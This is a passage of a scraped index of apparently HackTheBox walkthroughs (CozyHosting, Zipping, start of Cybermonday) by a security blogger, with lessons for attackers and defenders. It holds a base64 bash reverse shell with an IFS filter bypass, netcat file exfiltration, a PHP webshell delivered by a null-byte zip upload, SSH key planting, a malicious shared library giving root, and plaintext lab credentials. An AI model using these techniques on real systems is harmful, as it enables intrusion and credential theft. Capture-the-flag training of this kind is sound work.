echo &#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjE=&#34; | base64 # WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0eE15ODBORFEwSURBK0pqRT0K &#x1f62c; Ouch - it liked that even less. I&rsquo;ll try a different method of introducing spaces, using \${IFS}:
echo\${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0eE15ODBORFEwSURBK0pqRT0K|base64\${IFS}-d|base64\${IFS}-d|bash\${IFS}-i &#x1f431; Success! Got a shell!
USER FLAG cloudhosting-0.0.1.jar The reverse shell opened as user app in directory /app. Inside, there&rsquo;s a .jar file that was referenced several times within /actuator/env, called cloudhosting-0.0.1.jar. I&rsquo;ll transfer it to my attacker box and examine it:
sudo ufw allow from $RADDR to any port 4445 proto tcp nc -lvnp 4445 &gt; cloudhosting-0.0.1.jar nc -nv 10.10.14.13 4445 &lt; cloudhosting-0.0.1.jar The file is roughly 60MB, so it might take some time to transfer. To tell when it&rsquo;s finished, I&rsquo;ll watch the file size in another terminal tab:
cd ~/Box_Notes/CozyHosting watch -n 1 &#34;ls -lah&#34; While I&rsquo;m waiting for that file transfer, I&rsquo;ll take another look at /actuator/env to see what I can expect to find in the .jar file:
There&rsquo;s all kinds of stuff. Looks like maybe a credential and perhaps a database connection?
The file transfers finally finished, so I checked the source and destination files with sha256sum and they did indeed both match.
Bingo! In BOOT-INF &gt; classes &gt; application.properties the database credentials are in plaintext:
server.address=127.0.0.1 [...SNIP...] spring.jpa.database=POSTGRESQL spring.datasource.platform=postgres spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting spring.datasource.username=postgres spring.datasource.password=Vg&amp;nvzAQ7XxR For copy-pasting, that credential is postgres : Vg&amp;nvzAQ7XxR.
And in the file BOOT-INF &gt; classes &gt; htb.cloudhosting &gt; scheduled &gt; FakeUser.class we have the credentials for kanderson in plaintext too. kanderson : MRdEQuv6~6P9
User Enumeration - app As usual, in an effort to keep the walkthrough as brief as possible, I&rsquo;ll omit the procedure of user enumeration and instead I&rsquo;ll only discuss any noteworthy results of user enumeration.
josh is the human user on the box. Other than that, postgres and root are important. Useful tools on the box include nc, netcat, curl, wget, python3, perl, tmux. Netstat shows some interesting services running: Did not yet look into pspy Chisel SOCKS Proxy During user enumeration I found a locally-exposed port 5432 (definitely PostgreSQL). To access it, I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse --key s4ucys3cret Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.13:9999 R:1080:socks &amp; PostgreSQL Now that the proxy is up, I&rsquo;ll try accessing the database:
proxychains psql -h 127.0.0.1 -p 5432 -d cozyhosting -U postgres There is a users table, so I checked that right away:
I put those hashes into a file for cracking, hashes.txt:
Just for my own information, I also checked what the hash format was:
Then I set john to work. Thankfully, I got a result within a minute or so:
There are no users on the box called admin, so there&rsquo;s a good chance this will factor into some credential re-use. I&rsquo;ll try the other human user, josh first:
Lucky! Finally a nice &ldquo;cozy&rdquo; SSH connection &#x1f917;
So, confirmed, a valid credential is josh : manchesterunited
Thankfully, the user flag is sitting right there, adjacent to where the SSH connection appeared:
cat user.txt ROOT FLAG Shortcut to Win Normally, I&rsquo;d go through the whole process of user enumeration. However, one of the first commands I run when performing user enumeration told me all that I need to know:
I&rsquo;ve never considered SSH itself as a privilege escalation vector before, so I checked out the page on GTFObins. There is a fairly trivial way to just read a file using the elevated permissions:
ssh -F /root/root.txt localhost &#x1f370; And there&rsquo;s the flag! Nothing to it.
LESSONS LEARNED Attacker Look up common misconfigurations. Gaining the session token for kanderson was really easy, but at first I didn&rsquo;t know about this vulnerability at all. Initial recon turned up the &ldquo;actuator&rdquo; endpoint, but it took a little research to see how misconfiguration of &ldquo;actuator&rdquo; could actually be utilized.
Have a list of string escapes and bypasses. On this box, there was server-side input sanitization that prevented us from inputing spaces. This was a small hurdle for the command injection step, as we had to find another way to use spaces in a command, without them being rejected by the server. This is a pretty good resource.
Imagine what code is running server-side. This paradigm will help you craft a successful attack. Usually, the first step of figuring out what the code might be is to simply understand what the code is supposed to do. Read forms carefully; look for code comments; try to get the server to provide a stack trace. When all else fails, build test cases and take a black-box approach. Just because this box is primarily web, doesn&rsquo;t mean you can&rsquo;t utilize reverse-engineering techniques!
Defender Always prefer allowlists to denylists. When I first found remote code execution on the box through command injection on the /executessh endpoint, I saw that the server was denying requests that had a space in the username. However, there are many tricks to avoid that. While it might be possible for a developer to write a canonical list of every single way to make whitespace, it is much more realistic to write a simple regex for what should be allowed instead of what should not be allowed.
Tokens should expire. On this box, initial access was gained by re-using a session token gained during recon. While it is somewhat realistic that a token might be accidentally leaked, these tokens in practice should have a much tighter expiry time.
Don&rsquo;t circumvent safeguards. On this box, privesc to root happened because josh could sudo SSH. Now I&rsquo;ll ask, in what world does that actually make any sense? At best, this was a clumsy mistake by an ill-informed administrator. SSH provides a shell, so this is equivalent to giving josh full sudo access.
`,url:"https://4wayhandshake.github.io/walkthrough/cozyhosting/"},"https://4wayhandshake.github.io/walkthrough/zipping/":{title:"Zipping",tags:["Zip Slip","Null Byte","SQL Injection","Reverse Engineering","Shared Object Library"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION Zipping was released just minutes ago. It was released as the tenth box for HTB&rsquo;s Hackers Clash: Open Beta Season II. The box features a fictional e-commerce site (of what some might call a &ldquo;lifestyle brand&rdquo; *groan*). But good news - they&rsquo;re hiring! With the ability to upload your CV, get ready for some file upload shenanigans.
After initial entry, you&rsquo;re presented with a very fun little reverse engineering / binex challenge. A firm grasp on linux and C fundamentals will be a huge asset for gaining the root flag. Privilege escalation was a real treat! Have fun &#x1f44b;
RECON nmap scans For this box, I&rsquo;m running the same enumeration strategy as the previous boxes in the Open Beta Season II. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR Nmap scan report for 10.10.11.229 Host is up (0.18s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Ok, looks like just SSH and HTTP. Just in case, I&rsquo;ll do a quick UDP scan too:
Nmap scan report for 10.10.11.229 Host is up (0.19s latency). Not shown: 83 closed udp ports (port-unreach) PORT STATE SERVICE VERSION 53/udp open|filtered domain 67/udp open|filtered tcpwrapped 68/udp open|filtered tcpwrapped 138/udp open|filtered tcpwrapped 443/udp open|filtered https 497/udp open|filtered tcpwrapped 500/udp open|filtered isakmp 593/udp open|filtered tcpwrapped 1645/udp open|filtered radius 1900/udp open|filtered upnp 2000/udp open|filtered tcpwrapped 3283/udp open|filtered netassistant 17185/udp open|filtered wdbrpc 32768/udp open|filtered omad 32771/udp open|filtered sometimes-rpc6 49200/udp open|filtered unknown 49201/udp open|filtered unknown It&rsquo;s important to realize these could also just be filtered ports - UDP scans have a lot of false-positives. To investigate a little further for TCP ports, I ran a script scan over the ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA) |_ 256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519) 80/tcp open http Apache httpd 2.4.54 ((Ubuntu)) |_http-title: Zipping | Watch store |_http-server-header: Apache/2.4.54 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Just to be sure I got everything, I ran a script scan for the top 4000 most popular ports:
sudo nmap -sV -sC -n -Pn --top-ports 4000 -oN nmap/top-4000-ports.txt $RADDR # No new results Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=zipping.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 80 -o fuzzing/subdomains-root.md -of md -timeout 4 -ic -ac -v -fw 1 No results at all. I guess &ldquo;zipping&rdquo; isn&rsquo;t in my wordlist. No too surprising, but now I&rsquo;ll check for subdomains of zipping.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.zipping.htb&#34; -c -t 80 -o fuzzing/subdomains-zipping.md -of md -timeout 4 -ic -ac -v -fw 1 No new results from that, either. I&rsquo;ll move on to directory enumeration on http://zipping.htb. Some known/expected results include /shop, and /upload.php:
Note: When I first ran directory enumeration, I got lots of nuisance HTTP status 200 results, each of size 276B - so those are filtered out in the following ffuf command
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e php,asp,js,html -timeout 4 -v -fs 276 Directory &amp; file enumeration against http://zipping.htb/ gave the following:
Exploring the Website The website appears to be for a watch manufacturer called Zipping. The landing page has all the usual elements (most of which just have placeholder data or little blurps about this fictional company) and ends in a contact form that is not connected to anything. As shown in the directory &amp; file enumeration, there is a shop page, and a spot for uploads. Interestingly, uploads is connected to the &ldquo;Work with us&rdquo; CTA button shown at the top-right of this image:
Checked out the /shop page. The index page appears to show recent products. However, the Products tab appears to use a URI that might be susceptible to LFI.
I&rsquo;ll try running my LFI enumerator against it. Please see my github repo to try it out: https://github.com/4wayhandshake/LFI-Enumerator. The script requires a few things:
a wordlist of files that, when found, would indicate an LFI was discovered. Ideally, this list is not too long (under 100 lines) the address where the LFI should be rooted, ex. http://cybermonday/products &hellip;and a few other options not important for this scenario (see the github repo for more detail) To gather up the prerequisites, I first made a list of many files that might be indicative of an LFI, and saved them into targets.txt. I started with a list that I created:
etc/passwd passwd package.json app.js server.js robots.txt env .env dotenv index.html index.php mylogfile1 # this is the log file that I created earlier Then I appended a couple other wordlists onto it, and eliminated the duplicates:
cat /usr/share/seclists/Discovery/Web-Content/apache.txt &gt;&gt; targets.txt; \\ cat /usr/share/seclists/Discovery/Web-Content/nginx.txt &gt;&gt; targets.txt; \\ sort -u targets.txt &gt; target_files.txt WLIST=&#39;target_files.txt&#39;; \\ COOKIES=&#39;PHPSESSID=lj1iimtr7q0clb7ksoks8iudmk&#39;; \\ ./lfi-scan.sh &#34;http://zipping.htbshop/index.php?page=&#34; 0 8 &#34;$COOKIES&#34; &#34;$WLIST&#34; 0 &#39;&#39; &#39;&#39; &#39;&#39; \\ | tee lfi-enumeration-results.txt When it finished, I filtered for the results (if any):
grep -i -B 1 FFUF lfi-enumeration-results.txt No results. I tried also using an LFI rooted at page=products[LFI] and page=cart[LFI] but no attempts yielded any results.
Cart Functionality Exploring the /shop directory a little more, I noticed that the cart works a bit strangely. Normally, you&rsquo;d think a cart would just use cookies or something. But instead, this site seems to store the cart server-side, and rely on something like a small API to interact with the cart:
FOOTHOLD File Upload The upload page has some really specific instructions on it; It seems highly suspicious:
To try it out, I figured I would start with a valid PDF inside an actual zip file:
I opened up the PDF in the link, then downloaded it and compared the file hashes of the original and the downloaded one, and they matched:
Next, I tried taking an image, saving it with a .pdf extension, zipping that image, then uploading the zip. The server happily accepted and unzipped the file, but the link did not seem to render the actual image. Additionally, the hashes of the uploaded and downloaded files do not match:
On top of that, doing file beaver-2.pdf shows it is html, and cat beaver-2.pdf shows a 404 message:
&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt; &lt;html&gt;&lt;head&gt; &lt;title&gt;404 Not Found&lt;/title&gt; &lt;/head&gt;&lt;body&gt; &lt;h1&gt;Not Found&lt;/h1&gt; &lt;p&gt;The requested URL was not found on this server.&lt;/p&gt; &lt;hr&gt; &lt;address&gt;Apache/2.4.54 (Ubuntu) Server at 10.10.11.229 Port 80&lt;/address&gt; &lt;/body&gt;&lt;/html&gt; Next, I&rsquo;ll try uploading a simple php echo &ldquo;hello world&rdquo; script&hellip; Nope: again it failed to render.
I know there is a fun trick where you can establish a symlink within a zip file. I&rsquo;ll try it out. To set this up, I created a small directory structure mirroring the known structure of the website. This is meant to mirror how the files get unzipped to a directory like http://zipping.htb/uploads/2883a3a753ed4820574067d772dde59f/myfile.pdf
. ├── uploads │ └── filehash │ ├── evilarc.py │ ├── test.pdf -&gt; ../../uploads.php │ └── test.zip └── uploads.php The file test.pdf is simply a symlink to uploads.php, which is just an empty placeholder file represting the server&rsquo;s uploads.php. Then, I zipped the file:
zip --symlinks test.zip test.pdf And tried uploading that zip. To my surprise, the server accepted the file and I actually got a 403 Forbidden error when I tried to view it:
That&rsquo;s a good sign! it&rsquo;s probably pointing to the actual /var/www/html/uploads.php file, then! Next, I&rsquo;ll try a known system file:
ln -s ../../../../../../../../../etc/passwd etcpasswd.pdf zip --symlinks etcpasswd.zip etcpasswd.pdf Again, I uploaded the result. The page it displayed was blank, but then I downloaded it and read the file:
Wow! I can&rsquo;t believe that actually worked. I wonder if we can use this for code execution&hellip;
Hacktricks has a bit to say about how this could theoretically be done. It might be possible to get a file that is tagged as a PDF to actually be parsed as PHP, as long as there is a null byte in the filename:
Try to bypass the protections tricking the extension parser of the server-side with techniques like doubling the extension or adding junk data (null bytes) between extensions. You can also use the previous extensions to prepare a better payload.
That way, the string that is the filename stops being parsed at the null byte, and the file gets parsed as a PHP file, instead of the actual written extension (.pdf).
I tried this using a url-encoded null byte %00, with a zip made with a single file phpecho.php%00.pdf, but the downloaded file was simple the text of the php file: the php never got parsed, just interpreted as text &#x1f44e;
But that&rsquo;s not a real null byte. An actual null byte has hex value 0x00. So why not take the zip file and edit the filenames themselves, directly? To do this, I used hexedit. The &ldquo;pdf&rdquo; file has a single placeholder character &ldquo;A&rdquo; just to ensure the file stays the same length. Originally, both pieces of text in this file said phpinfo.phpA.pdf, but here the second entry has its &ldquo;A&rdquo; replaced with a null byte:
Next, I uploaded this modified zip file. Note how there is now a space in the filename:
This actually links to an invalid URL, which produces a 404 Not Found:
But if you delete the trailing .pdf from the url (including the space), the following displays:
Oddly enough, this trick only worked when the second of the two filenames had a null byte inserted. It did not work when either (1) both filenames had a null byte or (2) only the first filename had a null byte.
Weird, eh? I wonder why.
&#x1f37b; Incredible - phpinfo() is an actual php function, and it executed on the server. Is this RCE?
To take this one step further, I&rsquo;ll try uploading a php webshell instead of just a phpinfo() command. I used a very simple webshell:
&lt;?php if(isset($_REQUEST[&#39;cmd&#39;])){ echo &#34;&lt;pre&gt;&#34;; $cmd = ($_REQUEST[&#39;cmd&#39;]); system($cmd); echo &#34;&lt;/pre&gt;&#34;; die; }?&gt; I saved this PHP script as webshell.phpA.pdf. Then, again I zipped the file and modified the zip file in hexedit, exchanging the &ldquo;A&rdquo; in the second filename for a null byte. I uploaded the modified zip file and tried it out:
Success! &#x1f352;
Or the same thing using ls -aR /home/rektsu:
/home/rektsu: . .. .bash_history .bash_logout .bashrc .cache .config .gnupg .local .profile .ssh user.txt # [...SNIP...] /home/rektsu/.gnupg: . .. private-keys-v1.d pubring.kbx trustdb.gpg # [...SNIP...] /home/rektsu/.ssh: . .. (There&rsquo;s the user flag, user.txt. Just cat it for some remarkably easy points, if you dont want to wait for SSH)
USER FLAG SSH Connection Using the same webshell, I&rsquo;ll try planting an ssh key
ssh-keygen -t rsa -b 4096 chmod 700 id_rsa base64 -w 0 id_rsa.pub &gt; id_rsa.pub64 &amp;&amp; b64=$(cat id_rsa.pub64) tgtusr=&#34;rektsu&#34; encoded=$(echo -n &#34;echo $b64 | base64 --decode &gt; /home/$tgtusr/.ssh/authorized_keys&#34; | jq -s -R -r @uri) echo &#34;$encoded&#34; Then, I tried logging in to ssh using the key I planted:
&#x1f389; Alright! Worked perfectly. The SSH connection drops you into /home/rektsu, adjacent to the user flag. Simply cat it out for the points, if you havent already:
cat user.txt ROOT FLAG User Enumeration - rektsu Add some content here.
I&rsquo;ll follow my usual Linux User Enumeration strategy. To keep this walkthrough as brief as possible, I&rsquo;ll omit the actual procedure of user enumeration, and instead just jot down any meaningful results:
rektsu is the only human user on the box (besides root) They can sudo one thing without a password: But in fact, the program seems to prompt for its own password. Very suspicious. rektsu user only owns their /home directory. However, their group owns /var/www/html. Tools available on the box include socat, curl, wget, python3, perl, php. There is a MySQL database running on the box. Checking /usr/bin/stock I downloaded the binary to my attacker machine and opened it in IDA-free. Starting at the beginning of the program, I immediately see the password prompt, and it calls the function checkAuth:
Taking a quick peek at the checkAuth function reveals the password instantly:
Super! so St0ckM4nager is the password. I&rsquo;ll come back to this again when I finish user enumeration.
Checking the Web App I&rsquo;m most interested in learning how the cart works. As I remarked earlier, it seemed slightly strange that the cart was held by the instead of just existing as a cookie. Why is that? To find an answer, I took a look through the source code.
There is some very suspicious code right at the top of cart.php. it almost looks as if it&rsquo;s intentionally broken:
Ok, so if the application is using the MySQL database, and the credentials aren&rsquo;t in .env, nor are they in any kind of env or secrets file in /var/www/html, there&rsquo;s a good chance theyre inside the application itself.
It didn&rsquo;t take long to find some database credentials in there. Near the beginning of functions.php, the database connection info is shown:
Excellent, so MySQL / zipping root : MySQL_P@ssw0rd! is the database connection.
MySQL Oddly enough, I was not able to access MySQL through the socks proxy - I could only get into it locally, through the SSH connection. Regardless, it did not seem like the database had very much important information.
The products table listed exactly what one would assume it does. Nothing very interesting. I also checked the information_schema database to see if MySQL could do any arbitrary file reads or writes. Unfortunately, there doesn&rsquo;t seem to be any functionality like that.
Reversing /usr/bin/stock I wanted to take a closer look this program, locally on my attacker box. Since there is no netcat or nc on the box, I transferred it using scp:
scp -i id_rsa rektsu@$RADDR:/usr/bin/stock /home/kali/Box_Notes/Zipping/source/stock I loaded up stock in Ghidra and decompiled the code. In general, the program flow is this:
load the /root/.stock.csv file Check if the user has the right password (St0ckM4nager) Load some library file using a dlopen call Present the menu and prompt the user for a selection, in a loop, until 3 is chosen If 1 is chosen: Parse the data from /root/.stock.csv Print the current data If 2 is chosen: Parse the data from /root/.stock.csv Read input for how to change the values validate the input Update the valuesvalues Write the values to /root/.stock.csv If 3 is chosen, exit 0 Here is a sample run where I updated the stock values (this is from running the program on the target box):
Theres one really suspicious part of the program. It stands out from the rest of the code when it&rsquo;s decompiled:
Note that I&rsquo;ve renamed several variables in Ghidra to make the code more readable
// [...SNIP...] local_20 = strchr(strPassword,10); if (local_20 != (char *)0x0) { *local_20 = &#39;\\0&#39;; } boolPassedAuth = checkAuth(strPassword); if (boolPassedAuth == 0) { puts(&#34;Invalid password, please try again.&#34;); uVar1 = 1; } else { libFile = 0x2d17550c0c040967; local_e0 = 0xe2b4b551c121f0a; local_d8 = 0x908244a1d000705; local_d0 = 0x4f19043c0b0f0602; local_c8 = 0x151a; local_f0 = 0x657a69616b6148; XOR(&amp;libFile,0x22,&amp;local_f0,8); libHandle = dlopen(&amp;libFile,1); // [...SNIP...] That dlopen call - why is it there? The normal way to do this is to use an extern function and load a shared library that contains the function - but here we are using dlopen which is a different way that does not rely on the LD_LIBRARY_PATH environment variable.
But what library is it loading? I&rsquo;d have to figure out all that nonsense with the XOR function to really know. This is the XOR function:
void XOR(long param_1,ulong param_2,long param_3,long param_4) { int j; int i; i = 0; j = 0; while ((ulong)(long)j &lt; param_2) { if ((long)i == param_4 + -1) { i = 0; } *(byte *)(param_1 + j) = *(byte *)(param_1 + j) ^ *(byte *)(param_3 + i); i = i + 1; j = j + 1; } return; } What? It looks like it&rsquo;s selectively overwriting the bytes of param_1 between the indices of param_2 and param_4. It&rsquo;s overwriting those bytes with the result of XORing param_1[j] with param_3[i], generally.
I understand the code in general, but I wasnt successful writing something to reproduce the functionality. This was as far as I got. Don&rsquo;t bother running this - it causes a segfault and doesnt seem to work properly anyway:
#include &lt;stdio.h&gt; void XOR(unsigned long *param_1, unsigned long param_2, unsigned long *param_3, unsigned long param_4) { int j; int i; i = 0; j = 0; while ((unsigned long)(long)j &lt; param_2) { if ((long)i == param_4 + -1) { i = 0; } *(unsigned char *)(param_1 + j) = *(unsigned char *)(param_1 + j) ^ *(unsigned char *)(param_3 + i); i = i + 1; j = j + 1; } return; } int main() { unsigned long libFile, local_f0; libFile = 0x2d17550c0c040967; // Address of a library file, obfuscated local_f0 = 0x657a69616b6148; // Parameter to de-obfuscate XOR(&amp;libFile,0x22,&amp;local_f0,8); //local_28 = dlopen(&amp;libFile,1); // Load the library at libFile address printf(&#34;libFile: %x\\n&#34;, libFile); return 0; } I realized a much much easier way to figure out the result of the XOR function: Why not just run it through strace?
On my attacker box, I ran the program through strace and provided the password. Immediately, I saw what file was being loaded by that call to dlopen:
Nice! The program is trying to open /home/rektsu/.config/libcounter.so, and that&rsquo;s inside a directory owned by rektsu &#x1f44d; This shouldnt be too hard to exploitI; I&rsquo;ll just open a shell as root using the same process that was used to call /usr/bin/stock.
The only other thing to know is that every shared object library in C has its own special init function. This is the &ldquo;library&rdquo; I created, counter.c:
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; // Initialization function __attribute__((constructor)) void counter_init(void) { system(&#34;/bin/sh&#34;); } I compiled it, then transferred it to the target:
gcc -shared -o libcounter.so counter.c scp -i id_rsa /home/kali/Box_Notes/Zipping/source/stock-RE/libcounter.so rektsu@$RADDR:/tmp/.Tools/ Then, on the target I copied the library into the proper location where it would be picked up by /usr/bin/stock and ran it.
&#x1f389; Bingo! That&rsquo;s a root shell. Now simply cat out the flag for the points:
cat /root/root.txt And in case you were also curious about the actual structure of the csv file, here it is:
LESSONS LEARNED Attacker Tricks with strings are always in style. There is a reason that &ldquo;null-bytes&rdquo; is almost a catchphrase at this point - tricks involving clever string termination are very useful. Having a go-to list of tricks (hopefully organized by programming language) for working with text is like the gift that keeps on giving in the hacking world.
Don&rsquo;t be afraid to dump the hex. One easy utility for this is hexedit. It allows you to not only read, but also modify data in a very fine-grained manner. The format is also very similar to how you might use gdb, radare, or ida.
JSON + jq = besties. I feel like I learned about jq far too late in life. It&rsquo;s much more convenient to use than fiddling around with other tools. Once you start to use jq piped to/from other processes, it&rsquo;s easy to see that it is a more powerful concept than even (excellent) tools like Cyberchef.
Defender Keep plaintext passwords out of source code. When plaintext secrets are in C code, they are only one strace away from being known by the user. Even using a simple password hashing system is better than plaintext.
Dynamically loaded libraries should only exist in a trusted location. While it may be easy to cut a few corners while programming, this is one where the convenience does NOT justify the vulnerability it creates. All libraries should exist in a location inaccessible by an unprivileged user.
Minimize the attack surface. Was it really necessary to have gcc available on something that should strictly be a webserver? It&rsquo;s best to keep your development tools far enough away from a production environment. In skilled hands they can be used to break pretty much anything, just like physical construction tools.
`,url:"https://4wayhandshake.github.io/walkthrough/zipping/"},"https://4wayhandshake.github.io/walkthrough/cybermonday/":{title:"Cybermonday",tags:["E-Commerce","Debug Mode","Broken Authentication","Forged JWT","Algorithm Confusion","LFI","YAML","Docker Escape"],categories:["Walkthrough","HTB","Linux","Hard"],content:`INTRODUCTION At the time of writing this walkthrough, Cybermondaywas just released! It is the ninth box for HTB&rsquo;s Hackers Clash: Open Beta Season II. The site is a fictional e-commerce site. This box will test your knowledge of SQL, broken authentication, and definitely all the JWT tricks you can imagine! Have fun.
RECON nmap scans For this box, I&rsquo;m running the same enumeration strategy as the previous boxes in the Open Beta Season II. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan.txt $RADDR Host is up (0.17s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Is this box just http? To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR Host is up (0.17s latency). Not shown: 92 closed udp ports (port-unreach) PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 123/udp open|filtered ntp 443/udp open|filtered https 2000/udp open|filtered tcpwrapped 3703/udp open|filtered tcpwrapped 4444/udp open|filtered tcpwrapped 32771/udp open|filtered sometimes-rpc6 49154/udp open|filtered unknown To investigate a little further, I ran a script scan over the ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 74:68:14:1f:a1:c0:48:e5:0d:0a:92:6a:fb:c1:0c:d8 (RSA) | 256 f7:10:9d:c0:d1:f3:83:f2:05:25:aa:db:08:0e:8e:4e (ECDSA) |_ 256 2f:64:08:a9:af:1a:c5:cf:0f:0b:9b:d2:95:f5:92:32 (ED25519) 80/tcp open http nginx 1.25.1 |_http-title: Did not follow redirect to http://cybermonday.htb |_http-server-header: nginx/1.25.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Just to be sure I got everything, I ran a script scan for the top 4000 most popular ports:
sudo nmap -sV -sC -n -Pn --top-ports 4000 -oN nmap/top-4000-ports.txt $RADDR # No new results Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=cybermonday.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No result (turns out &ldquo;cybermonday&rdquo; is not in the wordlist I&rsquo;m using). Now I&rsquo;ll check for subdomains of http://cybermonday.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.cybermonday.htb&#34; -c -t 60 -o fuzzing/vhost-cybermonday.md -of md -timeout 4 -ic -ac -v Still nothing. I&rsquo;ll move on to directory enumeration on http://cybermonday.htb. Some known/expected results include /, /products, and /login:
Note: When I first ran directory enumeration, I got lots of nuisance HTTP status 200 results, each of size 2066B - so those are filtered out in the following ffuf command
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; OUTPUT=&#34;fuzzing/directory&#34; # Usually I use ffuf #ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o &#34;$OUTPUT.json&#34; -of json -e php,asp,js,html -timeout 4 -v -fs 2066 gobuster dir -w $WLIST -u http://$DOMAIN \\ --random-agent -t 10 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;$OUTPUT.txt&#34; \\ --no-error feroxbuster -w $WLIST -u http://cybermonday.htb -A -d 1 -t 100 -T 4 -f --collect-words --filter-status 400,401,402,403,404,405 --output &#34;$OUTPUT.json&#34; --rate-limit 10 Directory enumeration against http://cybermonday.htb/ gave the following:
Exploring the Website The website itself appears to be a basic e-commerce site, an online store selling electronic gadgets. The index page describes the store, and there is a login widget at the top-right, which also allows for user registration.
On the products pages, each item has a Buy button, but they don&rsquo;t appear to actually do anything. I&rsquo;ll register an account to see what else is accessible from a logged-in user. I registered as jimbob : fake@fake.fake : password. Logging in redirects to /home, where several options are presented:
This seemslike it might be useful, but in fact none of these &ldquo;action&rdquo; tiles are actually connected to anything. I get the impression the functionality was purposefully removed: for each &ldquo;action&rdquo; tile there are closing &lt;/a&gt; tags but no opening ones &#x1f914;
Regardless, this seems like a dead end right now. I&rsquo;m sure I&rsquo;ll be back on this page later, but I&rsquo;ll try some other things. Really, there are very few places to actually interact with the website; they include:
Home &gt; View Profile Register Login FOOTHOLD Source Code via Stack Traces I checked out the View Profile page thoroughly. It is not vulnerable to any kind of script injection or XSS. One notable thing though, is that a password is not actually required to change the username. This seems odd, but would only actually be useful if I could somehow log into a legitimate account and subsequently change their password without requiring re-authentication. Clearly, there&rsquo;s something lacking in the application logic. What about trying to change my username to admin?
Whoa! That is a lot of information. A stack trace, parts of the source code, and even the SQL statement that caused the error. The query at the top is this:
